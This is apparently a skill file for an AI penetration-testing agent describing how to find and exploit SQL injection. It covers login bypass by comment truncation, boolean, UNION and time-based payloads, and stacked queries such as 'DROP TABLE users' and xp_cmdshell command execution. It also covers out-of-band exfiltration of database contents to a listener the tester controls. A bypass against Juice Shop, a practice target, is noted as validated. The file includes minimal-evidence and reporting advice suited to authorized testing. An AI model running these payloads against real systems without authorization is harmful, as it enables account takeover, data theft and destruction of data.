---
name: SQL Injection
description: Find and exploit SQL injection, including the classic login-bypass pattern (comment-truncate the password check to authenticate as an arbitrary user, often admin, without knowing their password). Use on any login form, search/filter box, sort/order parameter, or ID-in-URL field - anywhere user input plausibly reaches a SQL query.
---

# SQL Injection

## Login bypass via comment truncation (try this first on any login form)
Many login queries are built as `SELECT * FROM users WHERE email = '<email>' AND password = '<hash>'`. If `<email>` isn't parameterized, you can truncate the query right after a known-valid email and comment out the rest - the password check never runs:
```
email:    admin@<domain>'--
email:    admin@<domain>' --
email:    ' OR '1'='1
email:    ' OR 1=1--
email:    <known_email>'-- -
password: (anything - it's never checked)
```
**Validated this session**: `admin@juice-sh.op'--` as the email with any password returned `HTTP 200` and a JWT with `"role":"admin"` - no password needed, no prior account. Always try the site's own visible admin/support email (often shown in "contact us", a `robots.txt`/`sitemap` hint, or just `admin@<the domain>`) with this pattern before anything more elaborate - it's a single request and frequently just works.

If a trailing `--` gets stripped or doesn't comment correctly for the DB in use, try `#` (MySQL), `/*` ... (generic), or close the string differently: `' OR '1'='1' -- `, `') OR ('1'='1`, `")) OR 1=1--` (varying quote/paren nesting for queries built with extra parens around the condition).

## Finding injectable parameters generally
Not just login - test every parameter that plausibly reaches a query: search/filter boxes, sort/order-by selectors, an ID embedded in a URL path or query string, a "category"/"tag" filter, pagination `limit`/`offset`. Use `ffuf`'s hidden-parameter mode (FUZZ in body/query against a parameter wordlist) if the only visible inputs don't pan out - the same technique used for SSTI/LFI discovery applies here.

Detection, roughly in order of how loud/useful the signal is:
1. **Error-based** - a single `'` causes a DB error (syntax error, stack trace naming the query/driver) in the response. Loudest signal, easiest to confirm, but noisy and often fixed first.
2. **Boolean-based** - compare `id=1 AND 1=1` (normal result) vs `id=1 AND 1=2` (empty/different result) with everything else identical. No error needed; the *difference* is the signal.
3. **UNION-based** - once you know the column count (`ORDER BY n--` until it errors, or `UNION SELECT NULL,NULL,...--` until it doesn't), `UNION SELECT` lets you pull arbitrary data (other tables, `sqlite_master`/`information_schema` for schema discovery) into a column that's actually displayed.
4. **Time-based blind** - when there's no visible difference at all: `' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)--` (SQLite) or `'; WAITFOR DELAY '0:0:5'--` (MSSQL) / `SLEEP(5)` (MySQL) style payloads - a measurable response delay confirms execution even with zero visible output difference.

## Stacked queries
If the driver/DB allows multiple statements in one request (varies by DB and client library - MySQL's default client does not, but some drivers and most admin/management interfaces do; MSSQL and PostgreSQL via certain connectors often do), a `;` after the injected clause lets you run an entirely separate statement: `'; DROP TABLE users--`, `'; EXEC xp_cmdshell('whoami')--`. Confirm the DB/driver actually supports it before relying on this - a single UNION-based read is lower-risk to demonstrate impact with, so prefer that when it's sufficient.

## Out-of-band exfiltration
When UNION/boolean/time-based are all blocked, too slow, or the response channel is too limited (no visible output at all), use the database's own network-capable functions to exfiltrate via a side channel - typically DNS or HTTP to a listener you control (the `interactsh` tool, or nuclei's `-oast` flag):
- **MySQL**: `LOAD_FILE()` for local file read if `FILE` privilege and `secure_file_priv` allow it; `INTO OUTFILE` to write a file (impact-dependent on web-root reachability); no native DNS exfil, but a writable file reachable over HTTP serves the same purpose.
- **MSSQL**: `xp_cmdshell` (if enabled) for direct command execution; `xp_dirtree`/`xp_fileexist` against a UNC path pointing at your own SMB/DNS listener for blind data exfil via the resolved hostname.
- **Oracle**: `UTL_HTTP.REQUEST`/`UTL_INADDR.GET_HOST_ADDRESS` to make the database itself issue an outbound request embedding extracted data in the hostname/path - classic OOB confirmation and exfil in one.

## NoSQL variant
See the dedicated `nosql-injection` skill for MongoDB-style operator injection - different enough from relational SQL (no string payloads, operator objects instead) to warrant its own file.

## Tools
- `http` for the login-bypass pattern and any other precise single-request test (no shell-quoting issues with the quotes/dashes these payloads are full of)
- `sqlmap` once you have a real injectable parameter confirmed manually - let it automate column-count/UNION/blind extraction rather than doing that by hand. Point it at the exact request (`-u`, `--data` for POST bodies) and the exact parameter (`-p`), not the whole app.
- `ffuf` for discovering parameters to test in the first place when none of the visible fields pan out

## Confirming impact, minimally
Login bypass as an existing (ideally admin) account is already strong, self-evident impact - you don't need to additionally dump the database to prove the finding. If going further (UNION-extracting other tables), stop at enough to demonstrate the boundary crossed (e.g. one other user's email/password hash, or the schema itself) rather than a full dump, per the minimum-evidence-necessary principle.

## Reporting
State the exact field, exact payload, and exact result (status code + the specific proof - e.g. the `role` claim in a returned JWT, or the extra row/column that appeared). Name which detection class it is (error/boolean/UNION/time-based) and whether it's SQL or NoSQL - that drives the fix (parameterized queries / an ORM that escapes correctly, vs. strict schema validation that rejects non-scalar input for NoSQL).
